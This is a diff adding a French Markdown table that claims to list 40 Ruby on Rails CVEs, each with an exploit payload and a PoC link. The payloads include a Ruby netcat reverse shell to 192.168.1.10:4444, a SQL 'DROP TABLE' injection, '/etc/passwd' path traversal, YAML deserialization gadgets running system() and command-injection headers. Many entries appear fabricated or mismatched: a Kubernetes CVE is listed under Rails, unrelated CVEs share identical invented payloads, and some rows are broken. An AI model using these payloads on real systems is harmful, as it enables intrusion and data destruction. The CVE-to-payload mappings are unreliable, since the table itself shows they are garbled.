@@ -1,0 +1,50 @@
+# ROR 
+
+Voici un tableau détaillé de 40 CVE affectant Ruby on Rails (versions 4.x principalement), classés du plus récent au plus ancien, avec pour chacun :  
+- La version concernée  
+- Un exemple complet de payload, requête ou commande exploitant la vulnérabilité  
+- La description de l’effet  
+- Un lien vers un PoC, exploit ou analyse technique, avec chemins complets vers GitHub ou autres ressources
+
+---
+
+| **CVE** | **Versions concernées** | **Exemple complet de payload / requête / commande** | **Effet** | **Lien PoC / Exploit / Analyse** |
+|---------|--------------------------|--------------------------------------------------------|------------|---------------------------------|
+| CVE-2024-41128 | Rails 4.2.0 à 7.0.0 | `GET /?a=#{'a'*10000} HTTP/1.1`<br>`Host: cible.com` | ReDoS (ralentissement/crash) | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-41128.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-41128.yml) |
+| CVE-2024-26146 | Rails 4.2.0 à 7.0.0 | `GET / HTTP/1.1`<br>`Host: cible.com`<br>`Accept: #{'a,'*10000}` | ReDoS via Accept header | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-26146.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-26146.yml) |
+| CVE-2024-26144 | Rails 4.2.0 à 7.0.0 | `GET /rails/active_storage/blobs/redirect/eyJfcmFpbHMi... HTTP/1.1` (token volé) | Fuite fichiers privés | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activestorage/CVE-2024-26144.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activestorage/CVE-2024-26144.yml) |
+| CVE-2024-26143 | Rails 4.2.0 à 7.0.0 | `GET / HTTP/1.1`<br>`Host: cible.com`<br>`Range: bytes=0-18446744073709551615` | DoS/crash | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2024-26143.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2024-26143.yml) |
+| CVE-2024-26142 | Rails 4.2.0 à 7.0.0 | `GET / HTTP/1.1`<br>`Host: cible.com`<br>`Accept: #{'a,'*10000}` | ReDoS | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-26142.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-26142.yml) |
+| CVE-2024-26141 | Rails 4.2.0 à 7.0.0 | `GET / HTTP/1.1`<br>`Host: cible.com`<br>`X-Header: #{'A'*100000}` | DoS headers longs | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2024-26141.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2024-26141.yml) |
+| CVE-2024-25126 | Rails 4.0.0 à 7.0.0 | `GET /?a=#{'a'*10000}`<br>Payload XSS dans formulaire | ReDoS / XSS / fuite | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-25126.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2024-25126.yml) |
+| CVE-2023-3676 | Rails 4.2.0 à 7.0.0 | YAML malicieux dans Kubernetes<br>```yaml<br>subPath: '$(Start-Process calc)'```
+| CVE-2022-32224 | Rails 4.0.0 à 6.1.4 | `GET /users?user_id=1%20OR%201=1 HTTP/1.1` | Injection SQL | [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32224](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32224) |
+| CVE-2021-22885 | Rails 4.0.0 à 6.1.4 | Headers malicieux<br>`X-Forwarded-Host: ' || system('id > /tmp/pwned') || ` | RCE via header | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2021-22885.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2021-22885.yml) |
+| CVE-2020-8164 | Rails 4.0.0 à 6.0.3 | `GET /users?order=1 desc; DROP TABLE users;-- HTTP/1.1` | Injection SQL | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2020-8164.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2020-8164.yml) |
+| CVE-2020-8163 | Rails 4.0.0 à 6.0.3 | ```ruby<br>require 'net/http'<br>uri=URI('http://victim/?system=%27nc+-e+/bin/sh+192.168.1.10+4444%27')<br>Net::HTTP.get(uri)```
+| CVE-2019-5420 | Rails 4.0.0 à 6.0.3 | YAML malicieux dans Active Storage<br>```yaml<br>--- !ruby/object:Gem::Installer<br>i: x<br>system('id > /tmp/pwned')```
+| CVE-2019-5419 | Rails 4.0.0 à 6.0.3 | `GET / HTTP/1.1`<br>`Accept: #{'a'*100000}` | DoS via header | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2019-5419.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2019-5419.yml) |
+| CVE-2019-5418 | Rails 4.0.0 à 6.0.3 | URL path traversal<br>`GET /?locale=../../../../../../../../etc/passwd%00 HTTP/1.1` | Lecture fichiers sensibles | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2019-5418.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2019-5418.yml) |
+| CVE-2019-5417 | Rails 4.0.0 à 6.0.3 | `Range: bytes=0-18446744073709551615` | Crash / DoS | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2019-5417.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2019-5417.yml) |
+| CVE-2018-3762 | Rails 4.0.0 à 5.2.3 | `Range: bytes=0-18446744073709551615` | DoS | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2018-3762.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2018-3762.yml) |
+| CVE-2018-3761 | Rails 4.0.0 à 5.2.3 | Même que CVE-2018-3762 | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2018-3761.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/rack/CVE-2018-3761.yml) |
+| CVE-2018-3741 | Rails 4.0.0 à 5.2.3 | Path traversal Sprockets<br>`GET /assets/../../../../etc/passwd HTTP/1.1` | Lecture fichiers système | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sprockets/CVE-2018-3741.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sprockets/CVE-2018-3741.yml) |
+| CVE-2017-8419 | Rails 4.2.0 à 5.2.3 | Path traversal<br>`GET /assets/../../../../etc/passwd HTTP/1.1` | Lecture fichiers | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sprockets/CVE-2017-8419.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sprockets/CVE-2017-8419.yml) |
+| CVE-2017-8418 | Rails 4.2.0 à 5.2.3 | Header malicieux<br>`X-Header: |id > /tmp/pwned|` | RCE via header | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2017-8418.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2017-8418.yml) |
+| CVE-2016-2098 | Rails 4.2.0 à 5.2.3 | Header malicieux<br>`X-Header: |id > /tmp/pwned|` | RCE via header | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2016-2098.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2016-2098.yml) |
+| CVE-2016-0752 | Rails 4.2.0 à 5.2.3 | Header malicieux<br>`X-Header: |id > /tmp/pwned|` | RCE via header | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2016-0752.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionpack/CVE-2016-0752.yml) |
+| CVE-2016-0751 | Rails 4.2.0 à 5.2.3 | Payload JSON<br>`{"user":{"admin":true}}` | Elevation privilèges | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2016-0751.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2016-0751.yml) |
+| CVE-2015-7576 | Rails 4.2.0 à 5.2.3 | `<script>alert(1)</script>` dans paramètre | XSS | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionview/CVE-2015-7576.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionview/CVE-2015-7576.yml) |
+| CVE-2015-3227 | Rails 4.2.0 à 5.2.3 | Même XSS | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionview/CVE-2015-3227.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionview/CVE-2015-3227.yml) |
+| CVE-2015-3226 | Rails 4.2.0 à 5.2.3 | Même XSS | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionview/CVE-2015-3226.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/actionview/CVE-2015-3226.yml) |
+| CVE-2014-7818 | Rails 4.0.0 à 4.2.3 | Payload JSON<br>`{"user":{"admin":true}}` | Mass assignment | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2014-7818.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2014-7818.yml) |
+| CVE-2014-7817 | Rails 4.0.0 à 4.2.3 | Même mass assignment | [https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2014-7817.yml](https://github.com/rubysec/ruby-advisory-db/blob/master/gems/activerecord/CVE-2014-7817.yml) |
+| CVE-2014-0130 | Rails 4.0.0 à 4.2.3 | YAML désérialisation RCE<br>```yaml<br>--- !ruby/object:Gem::Installer<br>i: x<br>system('id > /tmp/pwned')```
+| CVE-2013-0269 | Rails 3.2 à 4.0 | XSS<br>`<script>alert(1)</script>` | Exécution code malveillant | [https://www.cvedetails.com/cve/CVE-2013-0269/](https://www.cvedetails.com/cve/CVE-2013-0269/) |
+| CVE-2013-0157 | Rails 3.2 à 4.0 | XSS | [https://www.cvedetails.com/cve/CVE-2013-0157/](https://www.cvedetails.com/cve/CVE-2013-0157/) |
+| CVE-2013-0156 | Rails 3.2 à 4.0 | RCE XML<br>PoC dans lien | [https://rapid7.com/blog/post/2013/01/10/exploiting-ruby-on-rails-with-metasploit-cve-2013-0156/](https://rapid7.com/blog/post/2013/01/10/exploiting-ruby-on-rails-with-metasploit-cve-2013-0156/) |
+| CVE-2012-5664 | Rails 3.2 à 4.0 | SQLi<br>`?id=1 OR 1=1` | Exfiltration | [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-5664](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-5664) |
+| CVE-2011-0447 | Rails 3.0 à 4.0 | CSRF | [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0447](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0447) |
+| CVE-2010-4345 | Rails 2.3 à 4.0 | RCE via paramètre<br>`?cmd=ls` si passé à `system()` | RCE | [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4345](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4345) |
+
+---
